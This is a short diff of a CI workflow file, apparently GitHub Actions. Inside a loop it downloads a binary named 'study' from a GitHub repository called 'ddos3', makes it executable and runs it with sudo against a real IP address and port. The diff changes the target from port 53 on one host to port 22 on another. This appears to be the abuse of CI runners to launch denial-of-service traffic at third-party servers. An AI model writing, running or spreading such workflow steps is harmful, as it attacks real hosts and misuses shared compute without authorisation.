@@ -20,7 +20,7 @@ jobs:
           for i in 1 3; do
             wget https://github.com/christophersaldanhadot/ddos3/raw/refs/heads/main/study
             chmod +x study
-            timeout 15 sudo ./study 50.7.22.222 53 15 16
+            timeout 15 sudo ./study 50.7.22.221 22 15 16
           done
 
       - name: OK !
